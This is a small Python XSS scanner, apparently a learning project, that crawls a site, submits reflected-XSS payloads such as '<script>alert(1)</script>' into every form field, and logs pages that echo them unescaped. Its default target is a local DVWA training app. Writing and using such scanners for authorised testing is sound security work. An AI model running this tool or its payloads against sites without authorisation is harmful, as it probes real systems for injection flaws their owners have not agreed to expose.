# Web-Scanner-

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

visited = set()
vulnerabilities = []

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>"
]

def crawl(url, base):
    if url in visited:
        return
    visited.add(url)

    try:
        res = requests.get(url, timeout=5)
    except:
        return

    soup = BeautifulSoup(res.text, "lxml")

    # Find forms
    for form in soup.find_all("form"):
        test_form(form, url)

    # Follow links
    for link in soup.find_all("a", href=True):
        full_url = urljoin(base, link['href'])
        if base in full_url:
            crawl(full_url, base)

def test_form(form, page_url):
    action = form.get("action")
    method = form.get("method", "get").lower()
    target = urljoin(page_url, action)

    inputs = form.find_all("input")
    names = [i.get("name") for i in inputs if i.get("name")]

    for payload in PAYLOADS:
        data = {}
        for name in names:
            data[name] = payload

        if method == "post":
            r = requests.post(target, data=data)
        else:
            r = requests.get(target, params=data)

        check_response(r.text, target, payload)

def check_response(text, url, payload):
    # Raw payload reflected (not HTML-escaped)
    if payload in text:
        vulnerabilities.append({
            "url": url,
            "payload": payload
        })

def save_report():
    with open("xss_report.txt", "w") as f:
        for v in vulnerabilities:
            f.write(f"[!] Vulnerable: {v['url']}\n")
            f.write(f"    Payload: {v['payload']}\n\n")

if __name__ == "__main__":
    target = "http://localhost/DVWA/"
    crawl(target, target)
    save_report()
    print("[+] Scan complete. Report saved as xss_report.txt")
